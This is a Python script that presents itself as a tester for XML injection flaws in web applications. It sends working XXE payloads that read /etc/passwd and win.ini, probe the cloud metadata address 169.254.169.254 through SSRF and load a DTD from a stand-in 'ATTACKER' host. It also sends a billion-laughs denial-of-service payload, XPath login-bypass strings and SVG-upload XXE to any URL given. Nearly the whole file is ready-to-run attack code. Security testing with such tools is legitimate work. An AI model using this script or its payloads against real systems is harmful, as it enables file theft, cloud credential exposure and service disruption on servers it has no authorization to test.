#!/usr/bin/env python3
"""Agent for testing XML injection vulnerabilities.

Tests web applications for XXE (XML External Entity), XPath
injection, and XML entity expansion attacks that enable file
disclosure, SSRF, and denial of service.
"""

import json
import sys
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


XXE_PAYLOADS = {
    "file_read_linux": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    "file_read_windows": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
    "ssrf_http": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    "parameter_entity": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]><root>test</root>',
    "billion_laughs": '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>',
    "utf7_encoding": '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-',
}

XPATH_PAYLOADS = [
    "' or '1'='1",
    "' or 1=1 or '",
    "admin' or '1'='1",
    "'] | //user/password | //foo['",
    "1 or 1=1",
]


class XMLInjectionTestAgent:
    """Tests for XML injection vulnerabilities."""

    def __init__(self, target_url, output_dir="./xml_injection_test"):
        self.target_url = target_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _post_xml(self, path, xml_data, timeout=15):
        if not requests:
            return None
        try:
            return requests.post(
                f"{self.target_url}{path}",
                data=xml_data,
                headers={"Content-Type": "application/xml"},
                timeout=timeout,
            )
        except requests.RequestException:
            return None

    def _post_json(self, path, data, timeout=15):
        if not requests:
            return None
        try:
            return requests.post(
                f"{self.target_url}{path}", json=data, timeout=timeout
            )
        except requests.RequestException:
            return None

    def test_xxe(self, endpoint, custom_template=None):
        """Test endpoint for XXE vulnerabilities."""
        results = []
        for name, payload in XXE_PAYLOADS.items():
            if custom_template:
                payload = custom_template.replace("PAYLOAD_HERE", payload)

            resp = self._post_xml(endpoint, payload)
            if not resp:
                continue

            indicators = {
                "file_read_linux": "root:" in resp.text,
                "file_read_windows": "[fonts]" in resp.text or "extensions" in resp.text.lower(),
                "ssrf_http": "ami-id" in resp.text or "instance-id" in resp.text,
                "parameter_entity": resp.status_code == 200,
                "billion_laughs": resp.elapsed.total_seconds() > 5,
                "utf7_encoding": "root:" in resp.text,
            }

            if indicators.get(name, False):
                severity = "critical" if "file_read" in name or "ssrf" in name else "high"
                results.append({
                    "payload": name,
                    "status": resp.status_code,
                    "response_preview": resp.text[:200],
                    "vulnerable": True,
                })
                self.findings.append({
                    "severity": severity,
                    "type": "XXE",
                    "detail": f"{name} successful at {endpoint}",
                })
        return results

    def test_xpath_injection(self, endpoint, field_name="username"):
        """Test for XPath injection in search/login endpoints."""
        results = []
        for payload in XPATH_PAYLOADS:
            data = {field_name: payload}
            resp = self._post_json(endpoint, data)
            if not resp:
                continue

            if resp.status_code == 200 and len(resp.text) > 50:
                results.append({
                    "payload": payload,
                    "status": resp.status_code,
                    "response_length": len(resp.text),
                })
                self.findings.append({
                    "severity": "high",
                    "type": "XPath Injection",
                    "detail": f"XPath injection at {endpoint} with '{payload[:30]}'",
                })
        return results

    def test_content_type_switch(self, endpoint, original_json=None):
        """Test if endpoint accepts XML when JSON is expected."""
        payload = original_json or {"username": "test", "password": "test"}
        xml_equiv = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        xml_equiv += f'<root><username>&xxe;</username><password>test</password></root>'

        resp = self._post_xml(endpoint, xml_equiv)
        if resp and resp.status_code in (200, 201):
            accepted = True
            if "root:" in resp.text:
                self.findings.append({
                    "severity": "critical",
                    "type": "Content-Type Switch XXE",
                    "detail": f"Endpoint {endpoint} accepts XML with XXE when JSON expected",
                })
            return {"accepted": accepted, "status": resp.status_code}
        return {"accepted": False}

    def test_svg_xxe(self, upload_endpoint, field_name="file"):
        """Test SVG file upload for XXE."""
        svg_xxe = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>'''

        if not requests:
            return {"error": "requests not available"}
        try:
            resp = requests.post(
                f"{self.target_url}{upload_endpoint}",
                files={field_name: ("test.svg", svg_xxe, "image/svg+xml")},
                timeout=15,
            )
            if resp and "root:" in resp.text:
                self.findings.append({
                    "severity": "critical",
                    "type": "SVG XXE",
                    "detail": f"SVG upload at {upload_endpoint} triggers XXE",
                })
                return {"vulnerable": True}
        except requests.RequestException:
            pass
        return {"vulnerable": False}

    def generate_report(self, endpoints=None):
        xxe_results = []
        if endpoints:
            for ep in endpoints:
                xxe_results.extend(self.test_xxe(ep))

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "target": self.target_url,
            "xxe_results": xxe_results,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "xml_injection_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <target_url> [--endpoint /api/xml]")
        sys.exit(1)
    url = sys.argv[1]
    endpoints = ["/api/xml"]
    if "--endpoint" in sys.argv:
        endpoints = [sys.argv[sys.argv.index("--endpoint") + 1]]
    agent = XMLInjectionTestAgent(url)
    agent.generate_report(endpoints)


if __name__ == "__main__":
    main()
